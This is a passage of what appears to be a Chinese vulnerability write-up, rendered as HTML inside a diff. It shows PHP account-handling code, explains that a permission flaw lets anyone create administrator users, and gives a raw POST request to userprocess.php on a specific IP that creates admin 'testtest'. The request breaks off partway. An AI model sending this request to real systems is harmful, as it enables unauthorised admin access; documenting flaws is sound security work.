+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Success&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; successfully added to Database&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Error found with form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span> <span class="o">.</span> <span class="s2">&#34;?error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Registration attempt failed */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;reguname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;regsuccess&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Fail&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;ERROR: User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; could not be added to Database&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procForgotPass - Validates the given username then if
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * everything is fine, a new password is generated and
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * emailed to the address the user gave on sign up.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procForgotPass</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$database</span><span class="p">,</span> <span class="nv">$session</span><span class="p">,</span> <span class="nv">$mailer</span><span class="p">,</span> <span class="nv">$form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Username error checking */</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$subuser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$field</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span><span class="p">;</span>  <span class="c1">//Use field name for username
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$subuser</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$subuser</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setError</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="s2">&#34;Username not entered&lt;br&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span> <span class="o">.</span> <span class="s2">&#34;?error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/* Make sure username is in database */</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$subuser</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">30</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^([0-9a-z])+$/&#34;</span><span class="p">,</span> <span class="nv">$subuser</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">(</span><span class="o">!</span><span class="nv">$database</span><span class="o">-&gt;</span><span class="na">usernameTaken</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">setError</span><span class="p">(</span><span class="nv">$field</span><span class="p">,</span> <span class="s2">&#34;Unknown Username&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span> <span class="o">.</span> <span class="s2">&#34;?error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Errors exist, have user correct them */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="o">-&gt;</span><span class="na">num_errors</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;error_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/* Generate new password */</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newpass</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">generateRandStr</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/* Get email of user */</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$usrinf</span> <span class="o">=</span> <span class="nv">$database</span><span class="o">-&gt;</span><span class="na">getUserInfo</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$usrinf</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/* Attempt to send the email with new password */</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$mailer</span><span class="o">-&gt;</span><span class="na">sendNewPass</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">,</span> <span class="nv">$email</span><span class="p">,</span> <span class="nv">$newpass</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* Email sent, update database */</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$database</span><span class="o">-&gt;</span><span class="na">updateUserField</span><span class="p">(</span><span class="nv">$subuser</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$newpass</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">.</span> <span class="s2">&#34;alert(&#39;Your new password has been generated. The password was emailed to </span><span class="si">$email</span><span class="s2">&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">.</span> <span class="s2">&#34;window.close();&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">.</span> <span class="s2">&#34;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="cm">/* Email failure, do not change password */</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;forgotpass&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procEditAccount - Attempts to edit the user&#39;s account
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * information, including the password, which must be verified
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * before a change is made.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procEditAccount</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">,</span> <span class="nv">$form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Account edit attempt */</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$retval</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">editAccount</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;curpass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newpass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passconf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ulevelid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Account edit successful */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Success&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; successfully edited&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Error found with form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span> <span class="o">.</span> <span class="s2">&#34;?error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Registration attempt failed */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;regsuccess&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Fail&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;ERROR: User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; could not be edited&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procEditAccount - Attempts to edit the user&#39;s account
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * information, including the password, which must be verified
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * before a change is made.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procUpdateAccount</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// http or https check for url Protocol
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$protocol</span> <span class="o">=</span> <span class="s1">&#39;http&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTPS&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTPS&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;ON&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$protocol</span> <span class="o">=</span> <span class="s1">&#39;https&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">,</span> <span class="nv">$form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Account edit attempt */</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$retval</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">updateAccount</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passconf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ulevelid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Account edit successful */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Success&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; successfully edited&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$protocol</span> <span class="o">.</span> <span class="s2">&#34;://&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="s2">&#34;useradmin.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Error found with form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$protocol</span> <span class="o">.</span> <span class="s2">&#34;://&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="s2">&#34;useradmin.php?error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Registration attempt failed */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;useredit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;regsuccess&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$errors</span><span class="p">[</span><span class="s1">&#39;Fail&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;ERROR: User &#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; could not be edited&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$errors</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$protocol</span> <span class="o">.</span> <span class="s2">&#34;://&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="s2">&#34;useradmin.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Initialize process */</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$process</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Process</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户</p>
+<p>发送如下请求包创建管理员用户 testtest，密码为 testtest<a href="" rel="">@123 </a>
+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /lib/crud/userprocess.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 194.149.41.11
+</span></span><span class="line"><span class="cl">User-Agent: python-requests/2.25.1
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">Referer: http://194.149.41.11/useradmin.php
+</span></span><span class="line"><span class="cl">Origin: http://194.149.41.11/
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=test
+</span></span><span class="line"><span class="cl">Content-Length: 697
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">testtest
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">testtest@123
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;passconf&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">testtest@123
